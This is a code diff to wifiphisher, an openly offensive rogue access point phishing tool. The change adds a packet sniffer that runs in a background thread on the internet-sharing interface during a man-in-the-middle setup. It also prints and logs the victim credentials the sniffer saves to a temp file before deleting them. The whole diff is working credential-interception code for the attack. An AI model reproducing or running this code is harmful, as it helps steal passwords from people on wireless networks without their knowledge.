@@ -33,6 +33,7 @@ import wifiphisher.common.phishingpage as phishingpage
 import wifiphisher.common.recon as recon
 import wifiphisher.common.tui as tui
 import wifiphisher.common.victim as victim
+import wifiphisher.common.sniffer as sniffer
 
 from six.moves import range, input
 
@@ -346,6 +347,13 @@ class WifiphisherEngine:
         for cred in phishinghttp.creds:
             logger.info("Credentials: %s", cred)
             print(cred)
+        
+        if os.path.isfile('/tmp/wifiphisher-credentials.txt'):
+            print("[" + G + "+" + W + "] Credentials captured from the sniffer module:")
+            with open('/tmp/wifiphisher-credentials.txt','r') as capturedcreds:
+                credentials=capturedcreds.read()
+                logger.info("Credentials captured from the sniffer: %s", credentials)
+                print(credentials)
 
         # EM depends on Network Manager.
         # It has to shutdown first.
@@ -359,8 +367,11 @@ class WifiphisherEngine:
         self.template_manager.on_exit()
         self.fw.on_exit()
 
-        if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
-            os.remove('/tmp/wifiphisher-webserver.tmp')
+        if os.path.isfile('/tmp/wifiphisher-http-requests.txt'):
+            os.remove('/tmp/wifiphisher-http-requests.txt')
+
+        if os.path.isfile('/tmp/wifiphisher-credentials.txt'):
+            os.remove('/tmp/wifiphisher-credentials.txt')
 
         print('[' + R + '!' + W + '] Closing')
         sys.exit(0)
@@ -736,6 +747,18 @@ class WifiphisherEngine:
                 args=(NETWORK_GW_IP, PORT, SSL_PORT, template, self.em))
             webserver.daemon = True
             webserver.start()
+
+            time.sleep(1.5)
+        
+        elif self.opmode.internet_sharing_enabled() and args.mitminterface:
+            # Start the packet sniffer in a background thread
+            print('[' + T + '*' + W + '] Starting sniffing traffic on interface ' + 
+                internet_interface)
+            pktSniffer = Thread(
+            target=sniffer.sniffTraffic,
+                args=[internet_interface])
+            pktSniffer.daemon = True
+            pktSniffer.start()
 
             time.sleep(1.5)
 
